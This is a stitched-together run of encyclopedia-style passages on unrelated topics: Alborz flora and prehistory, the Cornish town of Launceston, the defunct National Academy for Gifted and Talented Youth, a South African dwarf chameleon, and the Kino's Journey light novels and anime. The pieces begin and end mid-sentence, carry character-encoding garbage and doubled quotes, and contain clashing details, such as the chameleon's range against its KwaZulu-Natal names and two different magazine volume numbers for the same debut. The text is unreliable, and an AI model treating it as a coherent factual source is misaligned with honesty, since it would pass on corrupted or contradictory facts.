elevations are arid with few trees. Juniper is the most common tree in inaccessible areas and at high elevation, while common shrubs are pistachio, maple, and almond. But in the northern slopes, the Caspian Hyrcanian mixed forests ecoregion is lush and forested. The natural vegetation of this region grows in distinct zones: the Hyrcanian forests on the lowest levels, beech forests in the middle zone, and oak forests in higher regions. The wild cypress is the dominant form of vegetation in some valleys, while olive trees grow in the western valleys of the Central Alborz near the Sefidrud. The bezoar ibex, Blanford's fox, R√ºppell's fox, red fox, Persian fallow deer, wild boar, Syrian brown bear, Persian leopard, Indian wolf, buzzard, goose, woodpecker, griffon vulture, and eagle are among important animals and birds found in the Alborz Mountains. The extinct Caspian tiger also lived in the Alborz Mountains. Prehistory Archaeological evidence from Alborz indicates that early human groups were present in the region since at least late Lower Paleolithic. The Darband Cave located at the Gilan Province contains evidence for late Lower Paleolithic. Stone artifacts and animal fossils were discovered by a group of archaeologists of the Department of Paleolithic of the National Museum of Iran and ICHTO of Gilan. The presence of large numbers of cave bear and brown bear remains and sparse stone artifacts at the site indicates that Darband primarily represents a bear den. The co-occurrence of artifacts and bear bones does not imply human predation or scavenging. Because there are no clear cut marks, except a few burning signs on the bear bones, they probably accumulated through natural processes.Biglari, F., V. Jahani 2011 The Pleistocene Human Settlement in Gilan, Southwest Caspian Sea: Recent Research, Eurasian Prehistory 8 (1-2): 3-28. During Middle Paleolithic period, Neanderthals were most probably were present in the region as their fossil have been found at northwest of Alborz, in the Azykh Cave. Their stone tools found in the Buzeir Cave and Kiaram cave and number of other surveyed sites.Biglari, F. (2019).

It is west of the middle stage of the River Tamar, which constitutes almost the entire border between Cornwall and Devon. The landscape of the town is generally steep particularly at a sharp south-western knoll topped by Launceston Castle.Ordnance Survey: Landranger map sheet 201 Plymouth & Launceston These gradients fall down to the River Kensey and smaller tributaries. The town centre itself is bypassed and is no longer physically a main thoroughfare. The A388 still runs through the town close to the centre. The town remains figuratively the \\"gateway to Cornwall\\", due to having the A30, one of the two dual carriageways into the county, pass directly next to the town. The other dual carriageway and alternative main point of entry is the A38 at Saltash over the Tamar Bridge and was completed in 1962. There are smaller points of entry to Cornwall on minor roads. Launceston Steam Railway narrow-gauge heritage railway runs as a tourist attraction during the summer months. It was restored for aesthetic and industrial heritage purposes and runs along a short rural route, it is popular with visitors but does not run for much of the year. Launceston Castle was built by Robert, Count of Mortain (half-brother of William the Conqueror) 1070 to control the surrounding area. Launceston was the caput of the feudal barony of Launceston and of the Earldom of Cornwall until replaced by Lostwithiel in the 13th century. Launceston was later the county town of Cornwall until 1835 when Bodmin replaced it. Two civil parishes serve the town and its outskirts, of which the central more built-up administrative unit housed 8,952 residents at the 2011 census. Three electoral wards include reference to the town, their total population, from 2011 census data, being 11,837 and two ecclesiastical parishes serve the former single parish, with three churches and a large swathe of land to the north and west part of the area. Launceston's motto (English translation: Royal and Loyal) is a reference to its adherence to the Cavalier cause during the English Civil War of the mid-17th century. History The Cornish name of \\"Launceston\\", Lannstevan, means the \\"church enclosure of St Stephen\\" and is derived from the former monastery at St Stephen's a few miles north-west (the castle and town were originally named Dunheved) and the Common Brittonic placename element lan-. Dunheved was the Southwestern Brittonic name for the town in the West Saxon period. The earliest known Cornish mint was at Launceston, which operated on a minimal scale at the time of √Üthelred the Unready before Cornwall received full diocesan jurisdiction in 994. Only one specimen is known to exist. In the reign of William the Conqueror, the mint was moved to Dunheved and remained in existence until the reign of Henry II, 1160.Cornish Church Guide (1925) Truro: Blackford; p. 198 During the reign of Henry III of England, another mint was established in Launceston. Launceston Castle, in good repair, is a Norman motte-and-bailey castle, and was built by Robert, Count of Mortain (half- brother of William the Conqueror) to dominate the surrounding area. Launceston was the caput of the feudal barony of Launceston and of the Earldom of Cornwall until replaced by Lostwithiel in the 13th century. Launceston was later the county town of Cornwall until 1835 when Bodmin replaced it. The lands of Robert, Count of Mortain, became the core holdings of the feudal barony of Launceston, and the Fleming family continued to hold most of their manors from that barony, as can be seen from entries in the Book of Fees. In the Domesday Book (1086) it is recorded that Launceston was held by the Count of Mortain, and that he had his castle there. There was land for 10 ploughs, 1 villein and 13 smallholders with 4 ploughs, 2 mills which paid 40 shillings (¬£2 sterling) and 40 acres of pasture. The value of the manor was only ¬£4 though it had formerly been worth ¬£20.Thorn, C., et al., eds. (1979) Cornwall. (Domesday Book; 10.) Chichester: Phillimore; entry 5,1,22 The Roman Catholic saint and martyr Cuthbert Mayne was executed at Launceston in 1577; a legacy of memorials and a church exists. =Civil War= During the English Civil War Launceston was known to be to Charles I of England, hence its coat of arms. His son, who was later crowned Charles II of England, stayed in the town for a couple of days en route to the Cavalier army based further west. In 1643, the Parliamentarian forces under the command of Major General James Chudleigh advanced in an attempt to capture Launceston from the Royalists. The Royalist commander, Ralph Hopton, 1st Baron Hopton, stationed his forces on the summit of Beacon Hill, a steep hill which overlooks the town. The Parliamentarians captured the foot of the hill, but were unable to dislodge the Royalist forces from the top. Hopton led a counterattack down the hill and, despite fierce fighting and the arrival of Parliamentary reinforcements, forced Chudleigh's troops to retreat. Sir Richard Grenville, 1st Baronet was committed by Prince Charles to Launceston Prison for refusing to obey Lord Hopton; Grenville had already quarrelled with General George Goring, Lord Goring. =Later history= Launceston has the only document in the UK signed by Mary II of England and her husband, William III of England. Launceston is said to have gained its historical importance from being the furthest into Cornwall that Justices and other Officers of the Crown felt safe to venture. (A more realistic reason was the very poor means of transport within Cornwall at the time which did not begin to be improved until the late 18th century.) When the situation had been improved Bodmin became the county town where the assizes were held (in 1835). Launceston's role as the de facto county town of Cornwall became established in the 13th century but it was never officially designated as the county town. Viscount Launceston was a title of nobility created in 1726 (as Viscount of Launceston) but is now extinct. In the early 19th century, Launceston gave its name to the settlement, Launceston, Tasmania, which is now the second largest city in Tasmania. During World War Two racial tensions in the ranks of American soldiers sparked a shootout in the town square. Fourteen African American soldiers of the 581st Ordnance Ammunition Company were charged with mutiny. Geography Prior's Bridge over the River Kensey Launceston is a market town, castle, recreational and heritage railway visitor town and the main shopping centre for the adjoining rural areas of west Devon and east Cornwall. The town is mainly built on the south side of a large hill almost immune to flooding, unlike its northern neighbourhood, Newport in part on a slightly wider plain at the bottom of the hill, which is susceptible to flooding by the River Kensey. The suburb of Newport is recorded for the first time during the 13th century. The natural advantages of the Launceston district had been recognised by the Anglo-Saxon monks of St Stephen and by the Norman lord of Cornwall in the reign of King William I. At this point in the course of the River Tamar it is joined by four tributaries within a short distance and its floodplain is relatively large, while further south the Tamar valley is narrow and meandering.Balchin, W. G. V. (1967) Cornwall: a description of the Ordnance Survey seventh edition one-inch sheets covering Cornwall. (British Landscapes through Maps.) Sheffield: Geographical Association; p. 25 Launceston is connected to the A30 trunk route, a dual carriageway bypass carrying its road traffic south of the town. The bypass crosses the River Tamar on the Dunheved Bridge built in 1975‚Äì1976 and substantially rebuilt 2006‚Äì2007. Through this the town is approximately west of Exeter, north-west of Plymouth and east of the smaller regional centre of Bodmin. It is roughly midway between the north coast of Cornwall (at Bude) and the south coast (at Saltash). Launceston civil parish comprises the town whereas St Stephens by Launceston Rural civil parish covers all outskirts, save for those south of the town. These each convene to discuss events funding, recreational funding and general planning matters. Stourscombe SSSI, a geological Site of Special Scientific Interest, one mile to the east of Launceston, is designated ‚Ä≥... for the best inland exposure of the Upper Devonian in South West England and the type locality of the Stourscombe Beds (Upper Famennian).‚Ä≥ Notable buildings South Gate Part of the town wall is still in existence including the South Gate of two arches. The White Hart Hotel incorporates a Norman doorway possibly removed from the Friary at St Thomas'. New Bridge (early 16th century) crosses the River Tamar: it is of granite. Two old bridges cross the River Kensey: one mediaeval and one built in 1580. The Baptist chapel is late 18th century and a number of Georgian houses may also be seen.Pevsner, N. (1970) Cornwall, 2nd ed. Penguin Books Three nonconformist churches/chapels served the 19th-century town: Wesleyan Methodist, Bible Christian, and Calvinist.GenUKI, op. cit. North Cornwall and West Devon's Elim Pentecostal Church is in the town. Lawrence House, a Grade II* listed building on Castle St, houses the town museum. Madford is a house built in the second half of the 17th century by Sir Hugh Piper. By 1777 it came into the possession of Richard Vyvyan of Trelowarren through his marriage to Philippa Piper. Philip Vyvyan, son of Richard, conveyed it to the Rev. John Lethbridge whose successors were attorneys and also town clerks and deputy recorders of Launceston. The legal firm of Lethbridge was joined in 1828 by Charles Gurney who in 1833 became town clerk, an office he held until 1867. The next town clerk was John Lethbridge Cowlard who bought Madford from his uncle in 1841 (he was also borough treasurer for over 50 years).Madford; Launceston Then! Administration Town Hall & Guildhall (1881‚Äì87) Launceston Chamber of Trade President's Chain showing the coat of arms and motto Launceston was a Parliamentary Borough from medieval times, with the right to return two members of parliament. However, before the 19th-century Reform Acts the right to vote was not held by all the residents but only by the freemen of the borough, and by 1832 there were fewer than 50 and it had come to be regarded as a rotten borough, one of many in Cornwall. Neighbouring Newport was also a borough with two MPs of its own. Launceston lost one of its two MPs and Newport both by the Great Reform Act of 1832; the area included in the borough of Launceston was considerably extended to enable the franchise to be opened up. It finally lost its right to separate representation in 1885, and became part of a new county constituency of Cornwall named after the town. Since 1918 it has been part of the North Cornwall parliamentary constituency. The current MP, since 2015, is the Conservative Scott Mann.

Economy The outskirts of Launceston host some large retail businesses with convenience, niche and fine weather tourist-catering commerce in the town centre. The three main industrial estates are Pennygillam, Scarne and Newport. Launceston is located on the A30 trunk road into Cornwall and has a number of transport based business mainly located in Pennygillam Industrial estate. A major local business is the DS Smith packaging products manufacturing plant. Launceston is located in predominately rural area and has a number of business dedicated to supporting the surrounding rural economy. The town has several restaurants, caf√©s, takeaways and a number of pubs. There are fewer pubs than in the Victorian era, a national trend with the larger ones tending to survive which specialise in their food, others of which provide live music events on a weekly basis. A tucking mill was established in the 15th century by the Flemings in the north of the town (Newport), water-powered, continuing in use for corn until 1968. A manuscript left by Richard Robbins (died 1910) records eight tanneries in the town in the 19th century. A mechanics' institute was founded in 1847 at the Central Subscription Room. The gasworks was established as early as 1834 by Waygood & Porter of Beaminster.Todd, A. C. & Laws, Peter (1972) The Industrial Archaeology of Cornwall.

The Natural Fibre Company (TNFC) is a British wool mill based in Launceston and is the only small-scale full range textile mill in the UK. The main focus of the business is to add value to naturally coloured raw fleece which is bought from farmers, smallholders and rare sheep breeders. Culture Dunheved Cross The poet Charles Causley was a native and long-standing resident of the town where he was both born and died. He was at one time contender for Poet Laureate and died in 2003, aged 86. His grave is in the St Thomas Churchyard near the house he lived in, which carries a blue plaque. He contributed the account of Launceston to a feature in the Sunday Times magazine called \\"Village England\\". He describes it as belonging to England rather than to Cornwall \\"\\"Launceston ... still encloses a particularly secret and inward-looking community. If an eye is cast beyond itself at all it is in the direction of England: half-marooned from the rest of Cornwall as we were until a century ago by the dangerous barrier of Bodmin Moor.\\"Village England, p. 7 Launceston is one of the most important towns in Daphne du Maurier's novel Jamaica Inn. Launceston annually hosted the \\"Castle Rock\\" music festival in July, which took place on the lower grounds of the castle which overlooks the town (within the outer walls). As well as a vibrant mix of local bands, the 2006 festival was headlined by Capdown which massively improved the event's profile. The first concert was performed in 2000 and featured a young artist who was unknown at the time, Jamie Cullum. The festival was headlined on two occasions by local Rock band Syrup, who were signed to Great West Records, which was set up by Big Country bass player, Tony Butler, and his long term friend, Luke Maguire. The Cornish & Devon Post is one of the newspapers for the district and its office is in the town. Local-specific editions of the paper and other publications are produced. It was founded in 1856 and incorporates the Launceston Weekly News. The Cornish Guardian North Cornwall edition covers Launceston.

The Grade I listed church of St Mary Magdalene was built in 1511‚Äì1524 by Sir Henry Trecarrel of Trecarrel near the town as a memorial to his infant son who died whilst being bathed. The ornate carvings in granite originally carved for the mansion he began to build at Trecarrel, Lezant have withstood the test of time. The tower dates from the 14th century, an earlier church and graveyard having occupied the site. Its grand organ was presented by a member of the Morice family of Werrington Park. The donor was either Sir William Morice, 3rd Baronet (1707‚Äì1750) or his successor Humphry Morice MP (1723‚Äì1785).

Education Five schools are in the town: *Three primary schools (St Catherine's Church of England Primary, St Stephen's Community Primary School and Launceston Community Primary School) cater for pupils aged 4 to 11. *St. Joseph's School, St Stephens Hill is an independent day school for boys and girls from age 3, going from nursery through the early years, junior department and into the senior school. The senior school boys and girls have been accepted into the sixth form from September 2012. *Launceston College was first established in 1409 and became a boys grammar school with boarding house before becoming fully inclusive and educating students aged 11 to 18 or 19. A former student of the last-mentioned college is actor Sir Roger Moore. In 1962, Horwell Grammar School for Girls, Dunheved Road, was merged with the school, and in 1965 the former Pennygillam School was added to form the present-day comprehensive school, which is still known as Launceston College. Since the 19th century (exact date unknown) the college has been at the southern end of Dunheved Road, approximately one kilometre from the town centre. In 1966 H. Spencer Toy, its principal, published A History of Education at LauncestonMarazion: Wordens of Cornwall, 1966; 408 p. detailing the development of education in the town and surrounding area. Launceston Community Primary School has the colloquial pseudonym Windmill Primary School, being situated adjacent to the site of the town's former windmill for grinding grain in Coronation Park. Transport Launceston is no longer connected to the national railway network, but was for almost a century served by two railway lines. The Great Western Railway (GWR) branch from Plymouth terminated in the town and the London and South Western Railway (LSWR) Exeter to Padstow North Cornwall Railway passed through. The stations were adjacent. The GWR station closed to passengers in 1952 after which all trains used the LSWR station until the North Cornwall line closed in 1966. The site of the station has been redeveloped for light industrial use. Currently, the town is 10 miles away from the nearest station at Gunnislake. The Launceston Steam Railway narrow-gauge heritage railway uses an adjacent site and runs for westward to Newmills along the valley of the Kensey. Notable residents The writer and historian, Joan Rendell lived at Yeolmbridge near Launceston. * The Rev.

It closed in August 2007, after Warwick University decided not to apply for the new contract. The Academy provided extracurricular activities for students between 11 and 19 years of age. It accepted students from all schools, whether state, CTCs, grammar or private, in the country and accepted all students deemed to be in the top 5%. The Academy itself was split into four distinct components, each of which had different aims and fields of work. The Student Academy was intended to provide provision directly for students; the Professional Academy aimed to improve the provision for Gifted and Talented youngsters in schools and colleges; the 'Expertise centre' intended to provide organizations with support when working with G&T; students; and the Research centre conducted research into gifted children and the most effective methods of teaching them. NAGTY was originally contracted for five years. In 2006, the DfES decided not to extend the contract and instead replace it with a \\"Managing Contractor for Gifted and Talented Education\\". This change in approach left Warwick University unwilling to bid, leading to the formation of the Young GIfted and Talented program, the replacement for NAGTY. Warwick has decided to work with partners to launch its own independent operation, the International Gateway for Gifted Youth, IGGY, with the first pilot program launching in 2008. The International Gateway for Gifted Youth re-launched as IGGY, a social network for gifted 13- to 18-year- olds, in October 2012.  Admissions  NAGTY changed its admissions policy radically during its run. Initially, all students had to submit a large portfolio, complete with an individual letter detailing why the student would like to join, and numerous pieces of evidence such as UKMT certificates, World Class Tests results, school work, SAT or GCSE results, IQ tests and references from teachers. This portfolio would then be examined by a number of professionals who either approved or declined these entrants, depending on whether or not they deemed that the applicant was in the top 5% of the national population. As admission numbers grew, NAGTY decided that it would be necessary to simplify the admissions, in order that they could be processed at a greater rate. The new process, renamed \\"Loc8or\\" (changed from \\"Talent Search\\" - the initial title), asked for 3 different areas of evidence: * A letter of application in which students had to introduce themselves, along with two questions that they would address to an expert in a particular field (these questions were never actually answered) * A portfolio (one or more pieces) of evidence of ability from a formal or standard test (such as those above) (the Academy was quoted as saying at the time: \\"However, we know that sometimes your test results don't always reflect your true potential, so we also ask for a third piece of evidence.\\") * Evidence from informal sources, such as a teacher's recommendation, or evidence of participation in an informal society or club (coursework could also be submitted for this section of evidence) However, at the end of 2003, the Loc8or process was again simplified so that the only requirement was a single piece of evidence and a form of endorsement from the applicant's school. This policy raised considerable debate amongst some parties, including some of NAGTY's own students, that the less stringent application process led to students being admitted that were not necessarily in the top 5%. The Academy denied this.  Activities  For its members, NAGTY offered a number of different activities, most of which were subsidised by the DfES. Some of these activities included: * Two or, as was the case up to 2007, three-week summer schools at universities around the country, covering a variety of subjects. The aims of the summer school's programs were to provide additional breadth (introducing participants to subjects they might not be able to engage with in the National Curriculum, for example), adding depth to a student's studies (by introducing them to additional material in a National Curriculum subject that might not ordinarily be covered in school) and providing acceleration to learning (introducing concepts that a student might normally expect to encounter at a later stage in his or her school career). These summer schools were open only to members of NAGTY in key stages 3 and 4 (ages 11‚Äì16). * Outreach events on weekends and weekdays during school holiday periods. These varied in length from half of a day to a week and were either residential or non-residential. They offered a rather condensed learning experience. Outreach events were later expanded to include lectures in a number of specific fields. * Online learning material (online study groups). This included contact with professionals in particular fields. * Residential week-long courses which were aimed at sixth form and college students. These were in collaboration with Villiers Park. * Internet forums which allowed members to talk informally, debate or gain moral and social support from each other. The aim of the Student Academy was to help students to maximize their potential, by providing additional activities and services that maintain engagement with and motivation for education.  Professional Academy  The Academy also provided a service for the education system of England and Wales, a service that was entitled the \\"Professional Academy\\". The aim of the Professional Academy was to work with schools to enable them to provide better education for gifted and talented youngsters than would otherwise be possible. In the long run, they aimed for a situation where as much emphasis and thought would be given to the education of gifted students as it was to people with special educational needs. The Academy attempted to achieve these aims through the use of teacher training and publications.  Expertise  The Academy also has an 'Expertise Centre', the aim of which was to study 'giftedness' and what it is that makes some children more 'clever' than others, and to research the best ways of educating such children. A wider aim was also to allow society to more widely understand the concept of 'giftedness' and encourage more research in this area.  Publications  The Academy produced a number of publications, all aimed at separate groups, but the majority of which were for use by the \\"Professional Academy\\". The main publication, which was intended for all of the students that were members of the Academy, was entitled Aspire and was published three times per year. The first seven issues of the magazine were distributed to both the professional and student academy, but from the eighth issue on, two publications were produced, one aimed at each of the two main focuses of the academy. Copies of this publication can be found on the Academy's website. IGGY The University of Warwick formally launched IGGY, a social network for gifted students, in October 2012. Closure In January 2010 the government announced that NAGTY would be closed the following month. It has since been replaced by IGGY: International Gateway for Gifted Youth.

It inhabits rather dry habitat on the border between the Great and Little Karoo of eastern Northern Cape and western Free State provinces, South Africa.

Description Its length is , relatively small for its genus, and it has bulbous scales of varying colors scattered around the body. The head crest is yellow, with white skin on its throat. Males have a short orange stripe around the middle of their bodies and red-spotted eyelids, whereas females are brown with smaller helmet-like protrusions. They otherwise have considerable variation in their colouration. Naming Its specific name thamnobates means \\"bush-walker\\". In addition to the common name Natal Midlands dwarf chameleon, it is also known under the longer common name of KwaZulu-Natal Midlands dwarf chameleon.: 'bush', 'shrub'; : ‚Äòone that treads or covers‚Äô. Relatives and taxonomy An emerald dwarf chameleon This is a very close relative of the black-headed dwarf chameleon (B. melanocephalum), which looks very different due to adaptation to low forest and fynbos on the slopes and cliffs seawards from the B. thamnobates range. B. melanocephalum and B. thamnobates may be phenotypically plastic populations of the same species, but juveniles of both species were raised under identical conditions and developed into what was phenotypically expected of their original populations, indicating they are separate species.Miller, A.K. & Alexander, G.J. (2009). Do Dwarf Chameleons (Bradypodion) Show Developmental Plasticity? Zoological Society of Southern Africa. An undescribed dwarf chameleon population from Gilboa and Karkloof Forests in KwaZulu-Natal seems closely related to both B. melanocephalum and B. thamnobates. It appears as if they radiated quite recently from a common ancestor, which probably was much like the Midlands form in appearance (as this is the most plesiomorphic of them). Indeed, ongoing gene flow or incomplete lineage sorting is indicated between these populations. Thus it is not certain whether they constitute one, three, or even more species, and more research is required.Tolley et al. (2004) Another undescribed dwarf chameleon, the bright green emerald dwarf chameleon, found in the Drakensberg between of 29¬∞15‚Ä≤S and 29¬∞45‚Ä≤S, is now known to be closely related to the Natal Midlands dwarf chameleon and may yet be described as a separate species. Distribution The range of the Midlands and Gilboa Forest populations and that of the Drakensberg dwarf chameleon (B. dracomontanum) require delimitation, as they appear to touch in eastern Lesotho and adjacent South Africa. The Drakensberg species is not closely related to the KwaZulu-Natal group, however, and no significant gene flow between them seems to occur. The Natal Midlands dwarf chameleon is classified as an Endangered species by the IUCN.WCMC (1996) It is used in local folk medicine.da N√≥brega Alves et al.

The series follows a traveler named Kino and her talking motorcycle named Hermes, as they explore countries with unique customs and people around a mysterious world, only spending three days at each location. The series originally started serialization in volume five of MediaWorks' now-defunct light novel magazine Dengeki hp on March 17, 2000. The first volume of the series was published on July 10, 2000 by ASCII Media Works under their Dengeki Bunko publishing imprint. As of July 2019, 22 volumes have been published, and around 8.2 million copies of the novels have been sold in Japan. A 13-episode anime adaptation produced by A.C.G.T and Genco aired between April and July 2003 on WOWOW in Japan. Two visual novels for the PlayStation 2 were released by ASCII Media Works, the first in July 2003, and the second in December 2005. There have also been two 30-minute animated films produced, the first in February 2005, and the second in April 2007. A Kino's Journey light novel was only released as a promotional gift for the second animated movie. Additional merchandise includes three art books, three picture books, and a drama CD. Two manga adaptations were produced, and a new anime series aired 12 episodes between October and December 2017. A spin-off light novel series titled began with the first volume published on July 10, 2006 by ASCII Media Works; four volumes have been released as of July 2010. Plot In Kino's Journey, the protagonist, Kino, accompanied by a talking motorcycle named Hermes, travels through a mystical world of many different countries and forests, each unique in its customs and people. She only spends three days and two nights in every town, without exception, on the principle that three days is enough time to learn almost everything important about a place, while leaving time to explore new lands. Kino says in The Land of Visible Pain that this principle is probably a lie, specifically noting \\"if I stay any longer, I'm afraid I will settle down.\\" The recurring theme of the anime and novels is described by the phrase, \\"The world is not beautiful, therefore it is.\\" Kino's Journey explores what the anime director Ry≈´tar≈ç Nakamura described as \\"a radical sense of 'beauty,'\\" and brutality, loneliness, nonsense, oppression and tragedy are often juxtaposed against compassion and a fairy-tale atmosphere. For protection and hunting, Kino carries a .44 single action revolver (called \\"the Cannon\\", based on a Colt Walker) that uses liquid explosives in place of gunpowder and a .22 automatic pistol (named \\"the Woodsman\\", based on a Colt Woodsman). Later in Kino's adventures in the novels, Kino also uses a pump action shotgun (based on a Winchester M1897) and a semi-automatic sniper rifle (called \\"the Flute\\", based on an M14 rifle), along with a variety of other tools, including knives. In the anime, Kino is shown to carry no fewer than five knives, including one which can fire .22 bullets from its hilt. Kino is an unusually quick draw and practices every day before dawn. Technology in this world exists, sometimes to the level of science fiction, although anachronisms are common (for example, the same land that has talking robots also appears to have phonographs, yet simultaneously the world has only begun to develop heavier-than-air flight). The level of technology also varies from country to country. The world is not heavily magical (the only \\"magical\\" elements include land that moves, talking vehicles, and a talking dog), although it has a certain fairy-tale quality. Characters Kino sitting in front of Hermes, her talking motorcycle. ; : :Kino is the main protagonist in the series and travels to different countries with her talking motorcycle Hermes, discovering their cultures and people. In the anime, Kino's gender is ambiguous in the beginning, but was confirmed to be female in the fourth episode, when she first meets Hermes and borrows the name \\"Kino\\" from another traveler. She is skilled in combat, carrying both guns and knives, and is accustomed to life as a traveler. To those she meets, she is invariably polite and answers questions directly. ; : :Hermes is a talking Brough Superior motorcycle and is Kino's loyal companion; although it can be reluctant sometimes, it faithfully accompanies Kino in her travels. The relationship between Kino and Hermes is presented as symbiotic‚Äîas explained in the Land of Adults where Hermes provides speed, and Kino provides balance. In the first couple of episodes of the anime and almost all of the chapters in the novels, it has a tendency to mispronounce words and phrases. Its name is a reference to the Greek god Hermes. Although its name is spelled \\"Hermes\\", in the third book it emphasizes that the \\"H\\" in its name is silent. ; : :Not much is known about the original Kino, only that he is a young man with glasses and a calm demeanor who traveled by the same three-day rule that the main character Kino does. He arrived to the Land of Adults and was most likely the reason why the main character goes on her journey after he dies protecting her from the customs of her country. She often makes statements similar to the original Kino's and even quotes him on occasion. In the novels, the original Kino explains that he makes a living selling medicinal herbs and unusual items he finds while traveling. ; : :Shizu is a young man with a great talent for swordsmanship. He travels in a dune buggy with Riku, his talking dog companion. He appears in multiple stories just about him, Riku and Ti in the novels. Riku narrates all but one of these stories. Later in the novels, Kino and Hermes meet up with Shizu and Riku again, but Kino seems to remember only Riku's name. ; : :Riku is a talking dog of the Samoyed breed who travels with Shizu. He is large, white, and his face seems to be always smiling. Apparently, in the anime, Riku has only spoken to Hermes, as Kino does not believe Riku can speak when told about the discussion Hermes had with him. In the original anime version, Riku also speaks to Shizu, but in the English version, only barks or whimpers to him in these instances. In the novels, Riku speaks to both Kino and Hermes. In the 2017 anime, he speaks to both Kino and Hermes, much to the surprise of the latter. ; : :Ti, also known as Tifana, is a 12-year-old child Shizu befriends in the Ship Country. When Shizu decides to leave, she refuses to separate from him and decides to kill herself along with him. After being stopped by Kino, Ti is taken in by Shizu, traveling with him and Riku since then. Ti's weapon of choice is grenades, and she carries a bag containing a number of them for self-defense. ; : :Sakura is a girl from the country Kino visited in the last episode of the first anime series. She shares many similarities to Kino, such as her parents also owning an inn. In the English version of the first anime series, her name is changed to Lily in order to preserve the explanation that her name, pronounced slightly differently, becomes an insult. The children call her \\"Silly Willy\\" instead of and in this version. ; : :Shishou is Kino's master who taught her marksmanship. She lives in the forest and does not travel. Her actual name is unknown; \\"Shishou\\" is a title meaning \\"mentor\\" or \\"master\\" (although Kino does not realize this at first). In the final episode of the first anime series, which chronologically takes place before most other episodes, the gunsmith who repaired Kino's Cannon recognized it and told Kino that he once knew a young woman who insisted everyone call her \\"Shishou\\". She traveled between countries and stirred up trouble wherever she went. In the novels, multiple stories are devoted to her travels alongside a man referred to as her \\"student\\", when she was in her late twenties. She and her student are shown as being incredibly greedy, even to the point of being cruel. They travel in a battered yellow car resembling a Subaru 360. Media Tokyopop's English release of the first light novel volume featured a radically redesigned cover. =Light novels= Kino's Journey began as a series of light novels written by Keiichi Sigsawa, and illustrated by Kouhaku Kuroboshi. The series originally started serialization in MediaWorks' now-defunct light novel magazine Dengeki hp with the release of volume six on March 17, 2000. The first volume of the series was published on July 10, 2000 by ASCII Media Works under their Dengeki Bunko publishing imprint. As of July 10, 2019, 22 volumes have been published. The eighth volume of Kino's Journey, originally published in October 2004, was Dengeki Bunko's 1000th published novel. An additional volume entitled was only released as a promotional gift for the second animated movie. A collection of special chapters entitled Kino's Journey: the Sigsawa's World came with the first volume of ASCII Media Works' light novel magazine Dengeki Bunko Magazine on April 10, 2008. In commemoration of Dengeki Bunko's 20th anniversary, Kino's Journey was serialized weekly from April to September 2013 in several Japanese regional newspapers. The ten stories serialized during this period were included in the 17th volume published in October of the same year. The previous 16 volumes were released with new cover artwork also in commemoration of the anniversary. The light novel series has also been translated into Chinese, Korean, and German. Tokyopop licensed the novels under the original title Kino no Tabi for release in North America, and the first volume was published on October 3, 2006. The chapter order of Tokyopop's English release of the first volume differed from the original Japanese release. According to Tokyopop representatives, there are issues with the licensor that have left them unable to release further volumes of the series. Tokyopop used an image from the sixth chapter-title page from the original novel for use as the English novel cover. The first volume of a spin-off of the regular series titled Gakuen Kino was published on July 10, 2006 under Dengeki Bunko; as of October 10, 2019, six volumes have been released. The series is a collection of parodies originally published in three spin-off magazines of Dengeki hp: Dengeki p, Dengeki h, and Dengeki hpa. The spin-off features Kino as a magical girl in a school setting. Gakuen Kino was translated into Chinese and Korean. =Art books and manga= A 96-page art book containing illustrations by Kouhaku Kuroboshi was released by ASCII Media Works in March 2003. The book contained illustrations from Kino's Journey and the Allison series of light novels, which is created by the same people as Kino's Journey. Also included in the art book are original illustrations never released in the novel volumes, and an original Kino's Journey short story by Keiichi Sigsawa. Two more artbooks from Kouhaku Kuroboshi were released in commemoration of the novel series' 15th anniversary. These artbooks include illustrations from Kino's Journey up to the 18th volume, Gakuen Kino, all of the Allison light novels, and other novels by Keiichi Sigsawa, as well as artwork by Kouhaku Kuroboshi as Takeshi Iizuka. Three picture books were also released by ASCII Media Works under their Dengeki Bunko Visual Novel label. The first, released on December 3, 2003, contained forty-eight pages and is entitled . The first picture book came bundled with an audio CD containing image songs (one of which is based on the tune of Pachelbel's Canon). The second book, released on October 19, 2005, contained eighty pages and is entitled . The second book was released in two editions, with the difference between the two being a DVD of the first animated film Kino's Journey: In Order to Do Something ‚ÄîLife Goes On‚Äî. The third book, released on December 25, 2007, contained 40 pages and is entitled . The third book came bundled with a DVD of the second animated film Kino's Journey: Country of Illness ‚ÄîFor You‚Äî. A manga adaptation of the spin- off series Gakuen Kino was illustrated by the d≈çjinshi group Denn≈ç ≈åwadan. It began serialization in volume 10 of ASCII Media Works' Dengeki G's Festival! Comic released on February 23, 2010. The manga continued serialization until volume 14 of Dengeki G's Festival! Comic published on October 26, 2010. It was transferred to ASCII Media Works' Dengeki G's Magazine with the December 2010 issue and ran until the June 2012 issue. It was compiled in three volumes. A manga adaptation of Kino's Journey, drawn by Iruka Shiomiya, began serialization in the April 2017 issue of Kodansha's Shonen Magazine Edge released on March 17, 2017. A second manga, with art by Gou, began serialization in the July 2017 issue of ASCII Media Works' Dengeki Daioh magazine released on May 27, 2017. =Anime= An anime adaptation produced by A.C.G.T and Genco, and directed by Ry≈´tar≈ç Nakamura, aired on the WOWOW satellite television network between April 8 and July 8, 2003, containing 13 episodes. The anime series was also rebroadcast across Japan by the anime satellite television network Animax, which also aired the series across its worldwide networks in Southeast Asia, East Asia, and South Asia. The episodes were released on six DVD compilations released between June 18 and November 19, 2003; the first volume contained three episodes, while each of the subsequent volumes contained two episodes. The series was re-released on DVD in popular editions again in six volumes, with the first three volumes bundled together and sold on January 19, 2005, and the last three volumes bundled together and sold on February 16, 2005. In addition to the main series, there is also a 12-minute-long prologue titled \\"Episode 0: The Tower Country ‚ÄîFreelance‚Äî\\" which was released as an original video animation with the first animated film's DVD release on October 19, 2005. The anime's opening theme is \\"All the way\\" by Mikuni Shimokawa and the ending theme is \\"The Beautiful World\\" by Ai Maeda; both singles were released on June 18, 2003. The 13-episode anime series was licensed for North American distribution by ADV Films. The episodes were initially released on four DVD compilations released between February 24, 2004 and June 29, 2004; the first volume contained four episodes, while each of the subsequent volumes contained three episodes. The first DVD volume was sold in two editions, with the difference between the two being a series box all four DVDs could fit inside. A DVD box set entitled Kino's Journey: The Complete Collection was released on October 25, 2005 containing three discs. In 2009, the series was re-released on three DVDs in a single case. Re-releases also happened in 2011, 2013, and 2017, all through ADV Films, one of the three anime series currently distributed by them while being succeeded by Section23 Films. It was announced by them that a SDBD set is also coming for a February 26, 2019 release. A second anime television series adaptation titled Kino's Journey ‚Äîthe Beautiful World‚Äî the Animated Series aired 12 episodes between October 6 and December 22, 2017. It was animated by Lerche and produced by Egg Firm. The series is directed by Tomohisa Taguchi, with Yukie Sugawara 